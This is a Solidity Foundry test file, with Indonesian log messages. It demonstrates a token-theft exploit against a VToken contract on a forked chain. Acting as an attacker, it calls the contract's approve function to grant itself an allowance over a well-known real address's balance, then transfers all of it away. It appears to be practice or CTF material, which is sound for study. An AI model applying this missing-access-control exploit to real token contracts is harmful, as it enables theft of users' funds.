// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import "./VToken.sol";

contract TestVToken is Test {
    VToken vtoken;
    address creator = makeAddr("creator");
    address attacker = makeAddr("attacker");
    address vitalik = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;

    function testSteal() external {
        vm.createSelectFork(vm.envString("ANVIL"));
        vm.deal(attacker, 100 ether);
        console.log("modalin attacker", address(attacker).balance);
        vm.startPrank(creator);
        vtoken = new VToken();
        vm.stopPrank();
        console.log("kontrak VToken dideploy di", address(vtoken));
        vm.startPrank(attacker);
        vtoken.approve(vitalik, address(attacker), vtoken.balanceOf(vitalik));
        console.log("token diapprove untuk attacker sebanya", vtoken.allowance(address(vitalik), address(attacker)));
        vtoken.transferFrom(vitalik, attacker, vtoken.balanceOf(vitalik));
        assertGt(vtoken.balanceOf(attacker), 0);
    }
}
